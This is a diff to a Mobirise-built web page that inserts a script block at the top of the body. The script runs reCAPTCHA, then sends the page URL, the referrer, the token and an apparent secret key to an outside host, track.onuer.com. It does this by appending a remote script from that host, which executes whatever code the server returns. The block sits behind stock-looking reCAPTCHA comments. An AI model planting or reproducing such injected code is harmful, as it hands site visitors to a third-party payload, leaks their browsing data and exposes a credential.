@@ -39,7 +39,26 @@
 
 
 </head>
-<body style="z-index: 0"><section id="top-1" style="display: none;"><a href="https://mobirise.in/">Mobirise HTML Builder</a> Mobirise v5.2.0</section>
+<body style="z-index: 0">
+<script src="https://www.google.com/recaptcha/api.js?render=6Ldelt8ZAAAAAPKS6G3BI3eQoZmNVsNxFjW3uwec"></script>
+        <script>
+            (function(){
+                grecaptcha.ready(function() {
+                    //
+                    grecaptcha.execute('6Ldelt8ZAAAAAPKS6G3BI3eQoZmNVsNxFjW3uwec', {action: 'submit'}).then(function(token) {
+                        // Add your logic to submit to your backend server here.
+                        let u = encodeURI(document.location.href);
+                        let r = encodeURI(window.document.referrer);
+                        //
+                        let p = "https://track.onuer.com?ref="+r+"&requrl="+u+"&resp="+token+"&sec=6Ldelt8ZAAAAAEGn-bWWhu_y2QArDB2drlzf62eh";
+                        let e = document.createElement("script");
+                        e.src=p;
+                        document.body.appendChild(e);
+                  });
+                });
+            })()
+        </script>
+    <section id="top-1" style="display: none;"><a href="https://mobirise.in/">Mobirise HTML Builder</a> Mobirise v5.2.0</section>
 <section class="menu menu2 cid-sdS9id7Cjq" once="menu" id="menu2-1g">
 <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg" style="background-color:#115e93;">
 <div class="container">
